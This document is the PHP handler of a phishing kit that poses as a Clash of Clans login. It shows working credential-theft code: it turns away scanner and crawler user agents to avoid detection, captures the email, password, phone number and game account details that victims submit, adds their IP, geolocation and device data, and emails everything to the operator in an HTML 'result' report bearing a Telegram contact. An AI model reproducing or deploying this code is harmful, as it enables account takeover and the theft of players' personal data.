<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/shagitz.php';
include 'system/device.php';
include 'changeHere.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$phone = $_POST['phone'];
$townhall = $_POST['townhall'];
$playertag = $_POST['playertag'];
$exp = $_POST['exp'];
$playername = $_POST['playername'];
$clan = $_POST['clan'];
$login = $_POST['login'];

$deviceInfo = $infos['platfrm_name'];
$osVersionInfo = $infos['platfrm_vers'];
$browserInfo = $infos['browser_name'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $townhall == "" && $playertag == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = " $shagitz_countryCode - $shagitz_flag | $shagitz_callcode | LOGIN $login | IP $shagitz_ipaddress $playertag";
$pesan = '
<center>
        <table style="border-collapse: collapse; table-layout: fixed; border-spacing: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; min-width: 320px; margin: 0 auto; background-color: #f0f2f5; width: 100%;" cellspacing="0" cellpadding="0">

<tbody>
<tr style="vertical-align: top;">
<td style="border-collapse: collapse !important; vertical-align: top;">

<div style="background-position: bottom; background-repeat: no-repeat; background-color: #f4f4f4;">

<div class="block-grid" style="margin: 0 auto; min-width: 320px; max-width: 370px; word-wrap: break-word; background-color: transparent;">

<table style="background: #000; background-size: 100% 100%; border-collapse: collapse; border-color: black; width: 100%; color: #000; text-align: center;" width="100%" height: 90px; border="1">

<tr style="border-top:0;">
<th style="border-color: black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 100%; height: 125px;">
</th>
</tr>
</table> 
<tr>                      <th style="background-color: #007bff; color: #ffffff; padding: 15px; font-size: 18px; font-weight: bold; text-align: center; line-height: 1.4;">MY RESULT</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; background-color: #ffffff;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">TH LEVEL</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$townhall.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">PLAYER NAME</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$playername.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">EMAIL</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$email.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">PASSWORD</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$password.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">PHONE NUMBER</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$phone.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">PLAYER ID</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$playertag.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">EXP LEVEL</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$exp.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">CLAN</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$clan.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">LOGIN</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$login.'</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; margin-top: 15px;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #007bff; color: #ffffff; padding: 15px; font-size: 18px; font-weight: bold; text-align: center; line-height: 1.4;">Device Information</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; background-color: #ffffff;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">DEVICE</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$deviceInfo.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">OS VERSION</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$osVersionInfo.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">BROWSER</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$browserInfo.'</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; margin-top: 15px;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #007bff; color: #ffffff; padding: 15px; font-size: 18px; font-weight: bold; text-align: center; line-height: 1.4;">Additional Information</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; background-color: #ffffff;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">IP ADDRESS</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_ipaddress.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">COUNTRY</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_country.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">PROVINCE</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_regionName.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">CITY</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_city.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">TIME ZONE</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_timezone.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">ISP INFO</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_isp.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">ASN INFO</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$shagitz_as.'</th>
                                    </tr>
                                    <tr>
                                        <th style="background-color: #f8f9fa; color: #495057; width: 35%; text-align: left; padding: 10px 15px; font-weight: bold; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5;">ENTRY TIME</th>
                                        <th style="color: #343a40; width: 65%; text-align: left; padding: 10px 15px; font-size: 13px; border-bottom: 1px solid #dee2e6; line-height: 1.5; font-weight: normal;">'.$jamasuk.'</th>
                                    </tr>
                                </tbody>
                            </table>
                            <table style="border-collapse: collapse; width: 100%; margin-top: 20px;" cellspacing="0" cellpadding="0">
                                <tbody>
                                    <tr>
                                        <th style="background-color: #007bff; color: #ffffff; padding: 10px 15px; font-size: 13px; text-align: center; line-height: 1.5; font-weight: bold;">Telegram: @Jonojoniads</th>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($my_email, $subjek, $pesan, $headers);
}
?>